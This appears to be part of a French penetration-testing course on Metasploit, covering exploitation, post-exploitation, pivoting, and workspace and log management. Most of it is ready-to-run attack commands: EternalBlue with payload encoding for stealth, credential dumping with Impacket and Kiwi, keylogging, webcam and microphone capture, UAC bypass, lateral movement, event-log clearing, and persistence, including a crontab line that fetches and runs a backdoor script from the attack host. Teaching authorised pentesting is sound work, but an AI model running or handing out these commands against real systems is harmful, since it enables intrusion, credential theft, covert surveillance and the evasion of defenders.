msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit
```

### Intégration avec Impacket

Impacket est une collection d'outils Python pour travailler avec les protocoles réseau Microsoft.

```bash
# Installation si nécessaire
pip3 install impacket

# Utilisation de psexec.py pour obtenir un shell
impacket-psexec Administrator:Password123@192.168.1.100

# Utilisation de secretsdump.py pour extraire les hachages
impacket-secretsdump Administrator:Password123@192.168.1.100
```

Intégration avec Metasploit :
```bash
# Extraction des hachages avec Impacket
impacket-secretsdump Administrator:Password123@192.168.1.100 > hashes.txt

# Utilisation des hachages dans Metasploit
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > exploit
```

> **POURQUOI ?**  
> L'intégration d'outils externes comme CrackMapExec et Impacket permet d'étendre les capacités de Metasploit et d'adopter une approche plus flexible pour l'exploitation. Ces outils offrent souvent des fonctionnalités complémentaires qui peuvent être combinées efficacement avec Metasploit.

## Documentation et suivi des exploitations

### Enregistrement des sessions

```
# Démarrage de l'enregistrement
msf6 > spool /home/kali/pentest/logs/exploitation_log.txt

# Arrêt de l'enregistrement
msf6 > spool off
```

### Capture d'écran et preuves

```
# Capture d'écran avec Meterpreter
meterpreter > screenshot

# Enregistrement des preuves de compromission
meterpreter > getuid
meterpreter > sysinfo
meterpreter > run post/windows/gather/hashdump
```

### Création d'un rapport d'exploitation

Documentez systématiquement chaque exploitation réussie :
- Vulnérabilité exploitée (CVE, description)
- Module et options utilisés
- Payload et configuration
- Résultat obtenu (type de session, privilèges)
- Preuves de compromission (captures d'écran, output de commandes)

## Bonnes pratiques pour l'exploitation

### Minimisation des risques

- Privilégiez les exploits avec la fonction `check`
- Commencez par les exploits les plus fiables (rank: excellent)
- Évitez les exploits connus pour causer des crashs ou des dénis de service
- Testez d'abord sur des systèmes non critiques si possible
- Planifiez les exploitations pendant les périodes de faible activité

### Exploitation discrète

- Utilisez des ports de communication standards (80, 443) pour les payloads
- Activez l'encodage et le chiffrement des payloads
- Limitez le nombre de tentatives d'exploitation
- Évitez les scans agressifs juste avant l'exploitation
- Utilisez des techniques d'évasion adaptées aux défenses en place

```
# Configuration pour une exploitation discrète
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 443
msf6 exploit(windows/smb/ms17_010_eternalblue) > set EnableStageEncoding true
msf6 exploit(windows/smb/ms17_010_eternalblue) > set StageEncoder x64/xor
msf6 exploit(windows/smb/ms17_010_eternalblue) > set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
msf6 exploit(windows/smb/ms17_010_eternalblue) > set SessionCommunicationTimeout 0
msf6 exploit(windows/smb/ms17_010_eternalblue) > set SessionExpirationTimeout 0
```

### Gestion des échecs

- Analysez les raisons des échecs d'exploitation
- Ajustez les options et réessayez avec des configurations différentes
- Essayez des exploits alternatifs pour la même vulnérabilité
- Documentez les tentatives infructueuses pour éviter de les répéter

```
# Activation du mode verbeux pour le débogage
msf6 exploit(windows/smb/ms17_010_eternalblue) > set VERBOSE true

# Tentative avec des options alternatives
msf6 exploit(windows/smb/ms17_010_eternalblue) > set GroomAllocations 16
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

## Automatisation de l'exploitation

### Création d'un script d'exploitation automatisé

Créez un fichier `auto_exploit.rc` dans votre répertoire de travail :

```
# Contenu du fichier auto_exploit.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS file:/home/kali/pentest/targets.txt
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set VERBOSE false
check
exploit -z
```

Utilisation du script :

```
msf6 > resource auto_exploit.rc
```

### Exploitation automatisée avec AutoSploit

AutoSploit est un outil qui automatise la recherche et l'exploitation de cibles vulnérables.

```bash
# Clonage du dépôt
git clone https://github.com/NullArray/AutoSploit.git
cd AutoSploit

# Installation des dépendances
pip3 install -r requirements.txt

# Lancement de l'outil
python3 autosploit.py
```

> **COMMENT ?**  
> Utilisez les outils d'automatisation avec une extrême prudence. Ils peuvent causer des dommages importants s'ils sont mal configurés ou utilisés sans discernement. Réservez-les aux environnements de test ou aux situations où vous avez une connaissance approfondie des cibles.

## En résumé

La sélection et l'exécution d'exploits constituent le cœur technique d'un test d'intrusion. Une approche méthodique, combinant une préparation minutieuse, une sélection judicieuse des exploits et une exécution contrôlée, vous permettra de maximiser vos chances de succès tout en minimisant les risques.

Points clés à retenir :
- Évaluez soigneusement les risques avant toute tentative d'exploitation
- Sélectionnez les exploits en fonction de leur fiabilité (rank) et de leur compatibilité avec la cible
- Utilisez la fonction `check` lorsqu'elle est disponible pour valider la vulnérabilité sans exploitation
- Configurez précisément les options du module et du payload
- Documentez systématiquement vos actions et les résultats obtenus
- Adoptez une approche discrète pour éviter de déclencher des alertes
- Automatisez avec prudence et uniquement dans des contextes appropriés

Dans la section suivante, nous verrons comment tirer parti des accès obtenus grâce à l'exploitation, en explorant les techniques de post-exploitation et l'utilisation des modules auxiliaires de Metasploit.
# Post-exploitation & modules auxiliaires

## Introduction à la phase de post-exploitation

Une fois qu'un système a été compromis avec succès, la phase de post-exploitation permet d'exploiter cet accès pour atteindre les objectifs du test d'intrusion : élévation de privilèges, persistance, collecte d'informations sensibles, ou pivotement vers d'autres systèmes du réseau.

### Pourquoi la post-exploitation est cruciale

> **POURQUOI ?**  
> La post-exploitation transforme un simple accès en une véritable valeur pour le test d'intrusion. Elle permet de démontrer l'impact réel d'une compromission, d'identifier les données sensibles accessibles, et de mettre en évidence les faiblesses de la sécurité en profondeur. Sans cette phase, un test d'intrusion se limiterait à prouver qu'une vulnérabilité existe, sans en montrer les conséquences concrètes.

## Gestion avancée des sessions Meterpreter

### Présentation de Meterpreter

Meterpreter est un payload avancé qui s'exécute entièrement en mémoire et offre de nombreuses fonctionnalités post-exploitation sans nécessiter l'installation d'outils supplémentaires sur la cible.

Caractéristiques principales :
- Exécution en mémoire (sans écriture sur le disque)
- Communication chiffrée
- Extensible via des scripts et des extensions
- Fonctionne sur diverses plateformes (Windows, Linux, Android, etc.)

### Types de sessions Meterpreter

| Type | Plateforme | Caractéristiques |
|------|------------|------------------|
| windows/meterpreter | Windows | Version classique pour Windows |
| windows/x64/meterpreter | Windows 64-bit | Optimisé pour systèmes 64 bits |
| python/meterpreter | Systèmes avec Python | Portable, moins de fonctionnalités |
| java/meterpreter | Systèmes avec Java | Portable, moins de fonctionnalités |
| php/meterpreter | Serveurs web PHP | Limité aux fonctionnalités web |
| android/meterpreter | Android | Fonctionnalités spécifiques aux mobiles |

### Commandes de base Meterpreter

```
# Informations sur le système
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# Navigation dans le système de fichiers
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users\\Administrator\\Desktop

# Manipulation de fichiers
meterpreter > cat important.txt
meterpreter > download secret.docx /home/kali/loot/
meterpreter > upload backdoor.exe C:\\Windows\\Temp\\
```

Exemple de sortie de `sysinfo` :
```
Computer        : WIN-SRV2019
OS              : Windows 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

### Gestion des processus

```
# Affichage des processus
meterpreter > ps

# Migration vers un autre processus
meterpreter > migrate 1234

# Exécution d'une commande
meterpreter > execute -f cmd.exe -i -H
```

> **COMMENT ?**  
> La migration vers un autre processus est une technique essentielle pour la stabilité et la persistance. Privilégiez des processus stables et de longue durée comme `explorer.exe` ou `lsass.exe`. La migration vers un processus avec des privilèges plus élevés peut également permettre une élévation de privilèges.

### Extensions Meterpreter

```
# Affichage des extensions chargées
meterpreter > use -l

# Chargement d'une extension
meterpreter > use stdapi
meterpreter > use priv

# Utilisation de fonctionnalités d'extension
meterpreter > screenshot
meterpreter > webcam_snap
meterpreter > keyscan_start
```

Extensions importantes :

| Extension | Description | Commandes notables |
|-----------|-------------|-------------------|
| stdapi | API standard (par défaut) | file, sys, net, ui, etc. |
| priv | Fonctionnalités privilégiées | hashdump, timestomp |
| kiwi | Version intégrée de Mimikatz | creds_all, kerberos_* |
| python | Exécution de scripts Python | python_execute |
| powershell | Exécution de PowerShell | powershell_execute |
| incognito | Usurpation de jetons | list_tokens, impersonate_token |

## Élévation de privilèges

### Techniques d'élévation de privilèges Windows

```
# Identification des opportunités d'élévation
meterpreter > run post/multi/recon/local_exploit_suggester

# Exploitation d'une vulnérabilité locale
meterpreter > background
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit

# Vérification des privilèges obtenus
meterpreter > getuid
```

Exemple de sortie de `local_exploit_suggester` :
```
[*] 192.168.1.100 - Collecting local exploits for x64/windows...
[*] 192.168.1.100 - 40 exploit checks are being tried...
[+] 192.168.1.100 - exploit/windows/local/cve_2020_0796_smbghost: The target appears to be vulnerable.
[+] 192.168.1.100 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
```

### Techniques d'élévation de privilèges Linux

```
# Identification des opportunités d'élévation
meterpreter > run post/multi/recon/local_exploit_suggester

# Exploitation d'une vulnérabilité locale
meterpreter > background
msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > exploit

# Vérification des privilèges obtenus
meterpreter > getuid
```

### Bypass UAC (User Account Control)

```
# Contournement de l'UAC
meterpreter > background
msf6 > use exploit/windows/local/bypassuac_injection
msf6 exploit(windows/local/bypassuac_injection) > set SESSION 1
msf6 exploit(windows/local/bypassuac_injection) > exploit

# Vérification du contournement
meterpreter > getprivs
```

> **POURQUOI ?**  
> Le contournement de l'UAC est souvent nécessaire même lorsque vous disposez d'un compte administrateur, car l'UAC limite les privilèges par défaut. Les techniques de bypass UAC permettent d'obtenir un contexte d'exécution avec tous les privilèges administratifs sans déclencher de prompt de confirmation.

### Techniques avancées avec Mimikatz (Kiwi)

```
# Chargement de l'extension Kiwi
meterpreter > load kiwi

# Extraction des identifiants en mémoire
meterpreter > creds_all

# Extraction des hachages SAM
meterpreter > hashdump

# Vol de tickets Kerberos
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use
```

Exemple de sortie de `creds_all` :
```
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Administrator  WORKGROUP  aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0  da39a3ee5e6b4b0d3255bfef95601890afd80709

wdigest credentials
==================

Username        Domain     Password
--------        ------     --------
Administrator   WORKGROUP  P@ssw0rd123!

kerberos credentials
===================

Username        Domain     Password
--------        ------     --------
Administrator   WORKGROUP  P@ssw0rd123!
```

## Persistance

### Mécanismes de persistance Windows

```
# Création d'un utilisateur administrateur
meterpreter > run post/windows/manage/enable_rdp
meterpreter > run post/windows/manage/add_user USERNAME=hacker PASSWORD=P@ssw0rd

# Installation d'une porte dérobée via le registre
meterpreter > run persistence -X -i 30 -p 443 -r 192.168.1.50

# Utilisation de WMI pour la persistance
meterpreter > run post/windows/manage/wmi_persistence
```

Options importantes pour le module `persistence` :

| Option | Description | Exemple |
|--------|-------------|---------|
| `-X` | Exécution au démarrage | `-X` |
| `-i` | Intervalle de connexion (secondes) | `-i 60` |
| `-p` | Port d'écoute | `-p 443` |
| `-r` | Adresse IP distante | `-r 192.168.1.50` |
| `-A` | Démarrage automatique du handler | `-A` |

> **COMMENT ?**  
> Le module `persistence` crée une entrée dans le registre pour exécuter un script VBS qui se connecte périodiquement à votre machine d'attaque. Cette méthode est relativement facile à détecter, mais efficace pour les tests d'intrusion.

### Mécanismes de persistance Linux

```
# Ajout d'une clé SSH
meterpreter > run post/linux/manage/sshkey_persistence

# Création d'un service systemd
meterpreter > run post/linux/manage/systemd_persistence

# Ajout d'une tâche cron
meterpreter > shell
$ echo "*/5 * * * * /usr/bin/curl -s http://192.168.1.50/backdoor.sh | bash" >> /etc/crontab
```

### Persistance avancée avec PowerShell Empire

PowerShell Empire est un framework post-exploitation qui s'intègre bien avec Metasploit.

```bash
# Installation de PowerShell Empire
sudo apt install powershell-empire

# Lancement d'Empire
sudo powershell-empire server

# Dans un autre terminal
sudo powershell-empire client

# Génération d'un stager
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host 192.168.1.50
(Empire: listeners/http) > execute
(Empire: listeners) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute
```

Exécution du stager depuis Meterpreter :
```
meterpreter > upload /tmp/launcher.bat C:\\Windows\\Temp\\
meterpreter > shell
C:\Windows\Temp> launcher.bat
```

> **POURQUOI ?**  
> PowerShell Empire offre des capacités post-exploitation avancées et des mécanismes de persistance sophistiqués qui complètent parfaitement Metasploit. L'utilisation combinée de ces deux frameworks permet une approche plus flexible et plus puissante.

## Collecte d'informations (Pillage)

### Extraction de données sensibles

```
# Recherche de fichiers intéressants
meterpreter > run post/windows/gather/enum_files

# Recherche de mots de passe
meterpreter > run post/windows/gather/credentials/credential_collector

# Extraction des cookies de navigateur
meterpreter > run post/windows/gather/enum_chrome

# Extraction des clés WiFi
meterpreter > run post/windows/gather/enum_wifi
```

### Capture d'écran et surveillance

```
# Capture d'écran
meterpreter > screenshot

# Enregistrement audio
meterpreter > record_mic -d 10

# Activation de la webcam
meterpreter > webcam_list
meterpreter > webcam_snap -i 1

# Keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

### Extraction de hachages et de secrets

```
# Extraction des hachages SAM
meterpreter > run post/windows/gather/hashdump

# Extraction des secrets LSA
meterpreter > run post/windows/gather/lsa_secrets

# Extraction des mots de passe en clair
meterpreter > load kiwi
meterpreter > creds_all
```

> **COMMENT ?**  
> L'extraction des hachages est souvent plus discrète que la recherche de mots de passe en clair. Vous pouvez ensuite tenter de casser ces hachages hors ligne ou les utiliser directement pour des attaques Pass-the-Hash.

### Énumération du réseau interne

```
# Découverte de réseaux
meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24

# Scan de ports interne
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.2.0/24

# Configuration du routage pour le pivoting
meterpreter > run autoroute -s 192.168.2.0/24
```

## Pivoting et mouvement latéral

### Configuration du pivoting

```
# Configuration manuelle des routes
meterpreter > run autoroute -s 192.168.2.0/24

# Vérification des routes
msf6 > route print

# Configuration d'un proxy SOCKS
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j
```

Configuration de ProxyChains :
```bash
# Édition du fichier de configuration
echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf

# Utilisation avec d'autres outils
proxychains nmap -sT -Pn 192.168.2.100
```

### Techniques de mouvement latéral

```
# Utilisation de PsExec
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.2.100
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass P@ssw0rd123!
msf6 exploit(windows/smb/psexec) > exploit

# Utilisation de WMI
msf6 > use exploit/windows/wmi/wmi_exec
msf6 exploit(windows/wmi/wmi_exec) > set RHOSTS 192.168.2.100
msf6 exploit(windows/wmi/wmi_exec) > set USERNAME Administrator
msf6 exploit(windows/wmi/wmi_exec) > set PASSWORD P@ssw0rd123!
msf6 exploit(windows/wmi/wmi_exec) > exploit
```

> **POURQUOI ?**  
> Le mouvement latéral est essentiel pour démontrer l'impact d'une compromission initiale. Il permet de montrer comment un attaquant pourrait progresser dans le réseau à partir d'un point d'entrée, soulignant ainsi l'importance de la sécurité en profondeur.

### Pivoting avancé avec Metasploit

```
# Port forwarding
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.2.100

# Utilisation du port forwardé
msf6 > rdesktop 127.0.0.1:3389

# Création d'un VPN avec Metasploit
msf6 > use auxiliary/admin/vpn/msf_vpn
msf6 auxiliary(admin/vpn/msf_vpn) > set ROUTES 192.168.2.0/24
msf6 auxiliary(admin/vpn/msf_vpn) > run
```

## Modules auxiliaires essentiels

### Scanners et énumérateurs

```
# Scanner SMB
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_version) > run

# Énumération SNMP
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/snmp/snmp_enum) > run

# Scanner de vulnérabilités SSH
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ssh/ssh_version) > run
```

### Modules de brute force

```
# Brute force SSH
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE false
msf6 auxiliary(scanner/ssh/ssh_login) > run

# Brute force SMB
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser Administrator
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/metasploit/common_passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > run
```

Options importantes pour les modules de brute force :

| Option | Description | Exemple |
|--------|-------------|---------|
| `BLANK_PASSWORDS` | Tester les mots de passe vides | `set BLANK_PASSWORDS true` |
| `USER_AS_PASS` | Tester le nom d'utilisateur comme mot de passe | `set USER_AS_PASS true` |
| `STOP_ON_SUCCESS` | Arrêter après le premier succès | `set STOP_ON_SUCCESS true` |
| `BRUTEFORCE_SPEED` | Vitesse de brute force (0-5) | `set BRUTEFORCE_SPEED 3` |

> **COMMENT ?**  
> Ajustez la vitesse de brute force en fonction du contexte. Une vitesse trop élevée peut déclencher des alertes ou bloquer des comptes. Pour les tests en production, privilégiez une approche plus lente et contrôlée.

### Modules de capture et de relais

```
# Serveur SMB pour capture de hachages
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /home/kali/pentest/hashes.txt
msf6 auxiliary(server/capture/smb) > run

# Relais LLMNR/NBT-NS
msf6 > use auxiliary/spoof/llmnr/llmnr_response
msf6 auxiliary(spoof/llmnr/llmnr_response) > set SPOOFIP 192.168.1.50
msf6 auxiliary(spoof/llmnr/llmnr_response) > run
```

### Modules d'exploitation de services spécifiques

```
# Exploitation de serveurs MSSQL
msf6 > use auxiliary/admin/mssql/mssql_exec
msf6 auxiliary(admin/mssql/mssql_exec) > set RHOSTS 192.168.1.100
msf6 auxiliary(admin/mssql/mssql_exec) > set USERNAME sa
msf6 auxiliary(admin/mssql/mssql_exec) > set PASSWORD password
msf6 auxiliary(admin/mssql/mssql_exec) > set CMD "whoami"
msf6 auxiliary(admin/mssql/mssql_exec) > run

# Exploitation de serveurs IPMI
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

## Intégration avec des outils externes

### BloodHound pour l'analyse Active Directory

BloodHound est un outil puissant pour visualiser et analyser les relations dans un environnement Active Directory.

```
# Collecte de données avec SharpHound depuis Meterpreter
meterpreter > load powershell
meterpreter > powershell_import /path/to/SharpHound.ps1
meterpreter > powershell_execute "Invoke-BloodHound -CollectionMethod All"
meterpreter > download C:\\Users\\Administrator\\Documents\\BloodHound.zip /home/kali/pentest/

# Analyse avec BloodHound
sudo neo4j console &
bloodhound &
```

> **POURQUOI ?**  
> BloodHound permet d'identifier rapidement des chemins d'attaque complexes dans Active Directory qui seraient difficiles à découvrir manuellement. Il est particulièrement utile pour identifier les opportunités d'élévation de privilèges et de mouvement latéral.

### CrackMapExec pour le mouvement latéral

```bash
# Installation si nécessaire
pip3 install crackmapexec

# Utilisation avec des identifiants obtenus
crackmapexec smb 192.168.2.0/24 -u Administrator -p 'P@ssw0rd123!' --shares

# Exécution de commandes à distance
crackmapexec smb 192.168.2.0/24 -u Administrator -p 'P@ssw0rd123!' -x 'whoami'

# Dump des hachages SAM
crackmapexec smb 192.168.2.0/24 -u Administrator -p 'P@ssw0rd123!' --sam
```

### Responder pour la capture de hachages

```bash
# Installation si nécessaire
sudo apt install responder

# Lancement de Responder
sudo responder -I eth0 -wrf

# Utilisation des hachages capturés dans Metasploit
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.2.100
msf6 exploit(windows/smb/psexec) > exploit
```

## Automatisation de la post-exploitation

### Scripts resource pour l'automatisation

Créez un fichier `post_exploit.rc` dans votre répertoire de travail :

```
# Contenu du fichier post_exploit.rc
run post/windows/gather/hashdump
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/windows/gather/enum_services
run post/windows/gather/enum_shares
run post/multi/recon/local_exploit_suggester
```

Utilisation du script :

```
meterpreter > resource /home/kali/pentest/post_exploit.rc
```

### Automatisation avec des scripts Meterpreter

```
# Création d'un script Meterpreter personnalisé
cat > /home/kali/pentest/auto_pillage.rc << EOF
run post/windows/gather/hashdump
run post/windows/gather/credentials/credential_collector
screenshot
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/multi/recon/local_exploit_suggester
EOF

# Utilisation du script
meterpreter > resource /home/kali/pentest/auto_pillage.rc
```

### Automatisation avec PowerShell

```
# Création d'un script PowerShell de post-exploitation
cat > /home/kali/pentest/post_exploit.ps1 << EOF
# Collecte d'informations système
Get-ComputerInfo | Out-File -FilePath C:\\Windows\\Temp\\sysinfo.txt

# Énumération des utilisateurs
Get-LocalUser | Out-File -FilePath C:\\Windows\\Temp\\users.txt

# Énumération des processus
Get-Process | Out-File -FilePath C:\\Windows\\Temp\\processes.txt

# Énumération des services
Get-Service | Out-File -FilePath C:\\Windows\\Temp\\services.txt
EOF

# Exécution depuis Meterpreter
meterpreter > upload /home/kali/pentest/post_exploit.ps1 C:\\Windows\\Temp\\
meterpreter > load powershell
meterpreter > powershell_execute "C:\\Windows\\Temp\\post_exploit.ps1"
meterpreter > download C:\\Windows\\Temp\\sysinfo.txt /home/kali/pentest/
meterpreter > download C:\\Windows\\Temp\\users.txt /home/kali/pentest/
meterpreter > download C:\\Windows\\Temp\\processes.txt /home/kali/pentest/
meterpreter > download C:\\Windows\\Temp\\services.txt /home/kali/pentest/
```

> **COMMENT ?**  
> L'automatisation de la post-exploitation permet de standardiser vos procédures, d'assurer l'exhaustivité de vos tests et de gagner un temps précieux. Adaptez vos scripts en fonction des objectifs spécifiques de chaque test d'intrusion.

## Nettoyage et couverture des traces

### Suppression des artefacts

```
# Suppression des fichiers créés
meterpreter > rm C:\\Windows\\Temp\\backdoor.exe
meterpreter > rm C:\\Windows\\Temp\\post_exploit.ps1

# Nettoyage des journaux d'événements Windows
meterpreter > clearev
```

### Désactivation des mécanismes de persistance

```
# Suppression des tâches planifiées
meterpreter > shell
C:\> schtasks /delete /tn "Backdoor" /f

# Suppression des clés de registre
meterpreter > reg deletekey -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor
```

### Documentation des actions de nettoyage

Documentez systématiquement toutes les modifications apportées au système pour pouvoir les annuler :

```
# Exemple de documentation
cat > /home/kali/pentest/cleanup_log.txt << EOF
Fichiers créés :
- C:\\Windows\\Temp\\backdoor.exe
- C:\\Windows\\Temp\\post_exploit.ps1

Utilisateurs créés :
- Nom: hacker
- Commande de suppression: net user hacker /delete

Tâches planifiées :
- Nom: Backdoor
- Commande de suppression: schtasks /delete /tn "Backdoor" /f

Clés de registre :
- HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor
- Commande de suppression: reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /f
EOF
```

> **POURQUOI ?**  
> Un nettoyage rigoureux est une marque de professionnalisme et de respect pour les systèmes du client. Il permet également d'éviter que vos outils ne soient réutilisés par de véritables attaquants après la fin du test d'intrusion.

## En résumé

La phase de post-exploitation est ce qui transforme un simple test de vulnérabilité en un véritable test d'intrusion. Elle permet de démontrer l'impact réel d'une compromission et d'identifier les faiblesses de la sécurité en profondeur.

Points clés à retenir :
- Utilisez Meterpreter pour ses nombreuses fonctionnalités post-exploitation intégrées
- Exploitez les modules d'élévation de privilèges pour maximiser votre accès
- Mettez en place des mécanismes de persistance pour maintenir l'accès
- Collectez méthodiquement les informations sensibles pour démontrer l'impact
- Utilisez le pivoting pour accéder à des réseaux internes non directement accessibles
- Automatisez vos procédures de post-exploitation pour gagner en efficacité
- Documentez rigoureusement toutes vos actions pour faciliter le nettoyage
- Intégrez des outils spécialisés comme BloodHound ou CrackMapExec pour enrichir vos capacités

Dans la section suivante, nous verrons comment gérer efficacement les workspaces, les logs et le reporting pour documenter et présenter les résultats de votre test d'intrusion.
# Gestion des workspaces, logs & reporting

## Introduction à la gestion de projet en pentest

La gestion efficace des données, la traçabilité des actions et la production de rapports de qualité sont des aspects essentiels mais souvent négligés du pentest. Cette section détaille les meilleures pratiques pour organiser vos projets, documenter vos actions et générer des rapports professionnels avec Metasploit.

### Pourquoi une bonne gestion de projet est cruciale

> **POURQUOI ?**  
> Une gestion de projet rigoureuse permet de maintenir l'organisation entre différents tests, d'assurer la traçabilité complète des actions (essentielle d'un point de vue légal), de faciliter la collaboration en équipe et de produire des rapports exploitables par les clients. Sans cette rigueur, vous risquez de mélanger les données de différents clients, de perdre des preuves importantes ou de produire des rapports incomplets.

## Gestion des workspaces Metasploit

### Principes fondamentaux des workspaces

Les workspaces dans Metasploit permettent de séparer logiquement les données de différents projets ou clients, évitant ainsi les mélanges d'informations et facilitant l'organisation.

```
# Affichage des workspaces existants
msf6 > workspace

# Création d'un nouveau workspace
msf6 > workspace -a client_xyz_mai2025

# Changement de workspace
msf6 > workspace client_xyz_mai2025

# Suppression d'un workspace
msf6 > workspace -d ancien_projet
```

Exemple de sortie de la commande `workspace` :
```
* default
  client_abc_avril2025
  client_xyz_mai2025
  formation_pentest
```

> **COMMENT ?**  
> Adoptez une convention de nommage cohérente pour vos workspaces, incluant le nom du client, le type de test et la date. Par exemple : `client_xyz_pentest_externe_mai2025`. Cela facilite l'identification et la gestion des projets à long terme.

### Organisation des workspaces par projet

Pour les projets complexes, vous pouvez adopter une structure hiérarchique :

```
# Création de workspaces pour différentes phases ou cibles
msf6 > workspace -a client_xyz_reseau_dmz
msf6 > workspace -a client_xyz_reseau_interne
msf6 > workspace -a client_xyz_applications_web
```

### Gestion avancée des workspaces

```
# Renommage d'un workspace
msf6 > workspace -r ancien_nom nouveau_nom

# Exportation d'un workspace spécifique
msf6 > workspace client_xyz_mai2025
msf6 > db_export -f xml /home/kali/pentest/client_xyz_mai2025.xml

# Importation d'un workspace
msf6 > workspace -a client_xyz_mai2025_restore
msf6 > db_import /home/kali/pentest/client_xyz_mai2025.xml
```

## Journalisation des actions (Logging)

### Configuration de la journalisation dans Metasploit

```
# Activation de la journalisation pour la session courante
msf6 > spool /home/kali/pentest/logs/metasploit_session_$(date +%Y%m%d_%H%M%S).log

# Désactivation de la journalisation
msf6 > spool off
```

Exemple de configuration permanente via `.msf4/msfconsole.rc` :
```
# Contenu du fichier ~/.msf4/msfconsole.rc
spool ~/pentest/logs/msf_$(date +%Y%m%d).log
setg LogLevel 3
setg VERBOSE true
```

> **POURQUOI ?**  
> La journalisation complète est essentielle pour plusieurs raisons : documentation légale des actions effectuées, possibilité de revenir sur des étapes précédentes en cas de problème, et matière première pour la rédaction des rapports. En cas d'incident pendant un test, ces logs peuvent également servir de preuve que vous avez agi dans le cadre défini.

### Niveaux de journalisation

| Niveau | Description | Cas d'usage |
|--------|-------------|-------------|
| 0 | Erreurs uniquement | Rarement utilisé |
| 1 | Erreurs et avertissements | Utilisation minimale |
| 2 | Informations standard (défaut) | Usage quotidien |
| 3 | Informations détaillées | Débogage et documentation |
| 4 | Débogage | Développement et analyse approfondie |
| 5 | Débogage avancé | Rarement nécessaire |

```
# Configuration du niveau de journalisation
msf6 > setg LogLevel 3
```

### Journalisation des sessions Meterpreter

```
# Enregistrement d'une session Meterpreter
meterpreter > record -h
